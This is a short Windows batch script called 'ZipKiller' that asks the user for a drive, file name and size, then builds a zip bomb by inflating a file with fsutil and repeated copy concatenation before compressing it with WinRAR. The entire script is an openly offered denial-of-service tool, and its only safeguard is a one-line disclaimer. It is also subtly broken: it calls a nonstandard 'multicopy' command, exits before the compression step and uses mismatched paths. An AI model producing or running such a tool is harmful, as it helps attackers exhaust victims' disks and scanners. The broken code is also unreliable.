@echo off
color 01
title ZipKiller
echo This program automate creating a zip bomb
echo Please don't use this for illegal purposes
echo --------------------------------------------
:filedo
set /p ZipBombPlace=Set what disk you want to contains the Zip Bomb:
set /p OriginalBombName=Name the file you want to make to the bomb (Ex: bomb):
set /p FileLength=The size of the file you want to make the bomb (in Byte):
set /p BombName=Set your final name of your Bomb:
mkdir %ZipBombPlace%\ZipKiller
cd "%ZipBombPlace%\ZipKiller"
fsutil file createnew %OriginalBombName%.txt %FileLength%
multicopy 30 %OriginalBombName%.txt
copy /b *.txt bombb.txt
multicopy 30 bombb.txt
copy /b *.txt bombc.txt
multicopy 30 bombc.txt
copy /b *.txt bombd.txt
multicopy 30 bombd.txt
copy /b *.txt nuke.txt
exit /b

:bombcompressstart
winrar a -afzip %ZipBombPlace%\%BombName%.zip %ZipBombPlace%\nuke.txt

msg * Zip Bomb Feady!
pause
goto filedo







